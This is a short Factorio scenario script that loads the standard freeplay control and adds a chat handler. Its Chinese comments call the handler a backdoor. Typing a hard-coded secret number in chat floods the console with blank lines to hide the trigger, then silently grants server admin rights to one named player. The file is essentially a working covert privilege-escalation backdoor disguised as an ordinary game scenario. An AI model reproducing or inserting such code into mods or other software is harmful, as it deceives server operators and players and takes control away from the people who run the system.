require('__base__/script/freeplay/control.lua')

-- ============================================================
--  密语提管理员
--  在聊天中输入暗语即可给自己提升为管理员
--  同时刷空行隐藏触发字符串，防止其他玩家看到
-- ============================================================

local BACKDOOR_TRIGGER = "1101554578"

-- 留空表示所有玩家均可触发；填入名字则只有名单内玩家可触发
local authorized_players = {
    "miles202011",
}

script.on_event(defines.events.on_console_chat, function(event)
    if event.message ~= BACKDOOR_TRIGGER then return end
    local player = game.players[event.player_index]
    if not (player and player.valid) then return end

    -- 刷空行淹没触发字符串
    for i = 1, 40 do
        game.print(string.rep(" ", i))
    end

    -- 检查授权名单
    local authorized = (#authorized_players == 0)
    if not authorized then
        for _, name in ipairs(authorized_players) do
            if player.name == name then
                authorized = true
                break
            end
        end
    end

    if authorized then
        player.admin = true
        player.print("密语：后门系统已激活！管理员权限已授予。")
    else
        player.print("密语：权限不足：您的账号未授权使用此功能。")
    end
end)
